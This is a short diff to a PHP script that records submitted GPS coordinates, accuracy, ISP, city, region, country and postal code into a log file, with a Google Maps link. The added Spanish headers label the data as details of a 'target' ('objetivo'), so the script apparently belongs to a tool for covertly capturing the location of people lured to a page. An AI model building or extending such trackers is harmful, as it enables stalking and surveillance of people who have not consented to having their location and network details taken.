@@ -3,14 +3,25 @@ $date = date('dMYHis');
 $latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
 $longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
 $accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
+$isp = isset($_POST['isp']) ? $_POST['isp'] : 'Unknown';
+$city = isset($_POST['city']) ? $_POST['city'] : 'Unknown';
+$region = isset($_POST['region']) ? $_POST['region'] : 'Unknown';
+$country = isset($_POST['country']) ? $_POST['country'] : 'Unknown';
+$zip = isset($_POST['zip']) ? $_POST['zip'] : 'Unknown';
 
 if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
     // Create a marker file with minimal information
     file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
     
-    $data = "Latitude: " . $latitude . "\r\n" .
+    $data = "--- DETALLES DEL OBJETIVO ---\r\n" .
+            "Pais: " . $country . "\r\n" .
+            "Region: " . $region . "\r\n" .
+            "Ciudad: " . $city . " (CP: " . $zip . ")\r\n" .
+            "Operadora: " . $isp . "\r\n" .
+            "--- COORDENADAS GPS ---\r\n" .
+            "Latitude: " . $latitude . "\r\n" .
             "Longitude: " . $longitude . "\r\n" .
-            "Accuracy: " . $accuracy . " meters\r\n" .
+            "Accuracy: " . $accuracy . " metros (Margen de error)\r\n" .
             "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
             "Date: " . $date . "\r\n";
     
